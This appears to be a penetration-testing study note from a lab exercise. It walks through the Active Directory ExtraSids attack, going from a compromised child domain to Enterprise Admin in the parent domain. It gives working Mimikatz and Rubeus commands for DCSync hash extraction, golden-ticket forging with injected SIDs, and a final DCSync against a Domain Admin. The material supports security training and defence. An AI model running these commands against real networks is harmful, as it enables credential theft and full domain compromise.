# SID History Primer
---
- **The [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios**. 
- If a **user in one domain is migrated to another domain**, a new account is created in the second domain. 
- **==The original user's SID will be added to the new user's SID history attribute==**, ensuring that the **user can still access resources in the original domain.**
- SID history is intended to work across domains, but can work in the same domain.
- Using Mimikatz, **an attacker can perform SID history injection** and **==add an administrator account to the SID History attribute of an account they control.==** When **logging in** with this account, **all of the SIDs associated with the account are added to the user's token.**
- If the **SID of a ==Domain Admin account is added to the SID History== attribute of this account**, then this account will be able to **==perform DCSync== and create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) or a Kerberos ticket-granting ticket (TGT)**

# ExtraSids Attack - Mimikatz
---
- This attack **==allows for the compromise of a parent domain once the child domain has been compromised.==**
- Within the same AD forest, **the [sidHistory](https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) property is respected** due to a lack of [SID Filtering](https://web.archive.org/web/20220812183844/https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) protection.
- **SID Filtering** is a protection put in place to **filter out authentication requests from a domain in another forest across a trust**.
- Therefore, if a user in a **child domain that has their sidHistory set to the `Enterprise Admins group`** (which **only exists in the parent** domain), they are **treated as a member of this group,** which allows for **==administrative access to the entire forest.==**
- In other words, we are **creating a Golden Ticket from the compromised child domain to compromise the parent domain**.
- In this case, we will leverage the **`SIDHistory` to grant an account (or non-existent account) Enterprise Admin rights** by modifying this **attribute to contain the SID for the Enterprise Admins group.**

- To perform this attack after compromising a child domain, w**e need the following:**
	- The **KRBTGT hash for the child domain**
	- The **SID for the child domain**
	- The **name of a target user in the child domain** (does not need to exist!)
	- The **FQDN of the child domain**.
	- The **SID of the Enterprise Admins group of the root domain**.
	- With this data collected, the attack can be **performed with Mimikatz.**


# Attacking
---
- First, we need to **obtain the NT hash for the [KRBTGT](https://adsecurity.org/?p=483) account of child domain,** which is a **service account for the Key Distribution Center (KDC)** in Active Directory.
- The account **KRB (Kerberos) TGT (Ticket Granting Ticket)** is **used to encrypt/sign all Kerberos tickets** granted within a given domain.
- Since **we have compromised the child domain**, we can **==log in as a Domain Admin or similar and perform the DCSync attack==** to **obtain the ==NT hash for the KRBTGT account.**==
## Obtaining the KRBTGT Account's NT Hash using Mimikatz
- `lsadump::dcsync /user:LOGISTICS\krbtgt`
- ![[Pasted image 20250817050510.png]]

## Using Get-DomainSID
- We can use the **PowerView `Get-DomainSID` function to get the SID for the child domain**, but this is **also visible in the Mimikatz** output above.
	- `Get-DomainSID`
	- ![[Pasted image 20250817050552.png]]

## Obtaining Enterprise Admins Group's SID using Get-DomainGroup
- Next, we can use **`Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group** in the **==parent domain==**
- We could also do this **with the [Get-ADGroup](https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps) cmdlet** : `Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"`:

	- `Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid`
	- ![[Pasted image 20250817050736.png]]
- ![[Pasted image 20250817050746.png]]

## Using ls to Confirm No Access
- Before the attack, **we can confirm no access to the file system of the DC in the parent domain.**:
	- ` ls \\academy-ea-dc01.inlanefreight.local\c$`
	- ![[Pasted image 20250817050823.png]]

## Creating a Golden Ticket with Mimikatz:
- `mimikatz.exe`
- `kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`
- ![[Pasted image 20250817050916.png]]

## Confirming a Kerberos Ticket is in Memory Using klist
- `klist`
- ![[Pasted image 20250817050937.png]]
## Listing the Entire C: Drive of the Domain Controller
- `ls \\academy-ea-dc01.inlanefreight.local\c$`
- ![[Pasted image 20250817051003.png]]

# ExtraSids Attack - Rubeus
- We can also **perform this attack using Rubeus**. 
## Creating a Golden Ticket using Rubeus
- The **`/rc4` flag is the NT hash for the KRBTGT account.** 
- **==The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group==** **in the parent domain**:
	- `.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`
	- ![[Pasted image 20250817051148.png]]
## Confirming the Ticket is in Memory Using klist:
- `klist`
- ![[Pasted image 20250817051208.png]]
## Performing a DCSync Attack:
- Finally, we can **==test this access by performing a DCSync attack against the parent domain==**, **targeting the `lab_adm` Domain Admin** user:

	- `.\mimikatz.exe`
	- `lsadump::dcsync /user:INLANEFREIGHT\lab_adm`
	- ![[Pasted image 20250817051304.png]]

- When **dealing with multiple domains and our target domain is not the same as the user's domain**, we will need to **==specify the exact domain to perform the DCSync operation==** on the particular domain controller:
	- `lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL`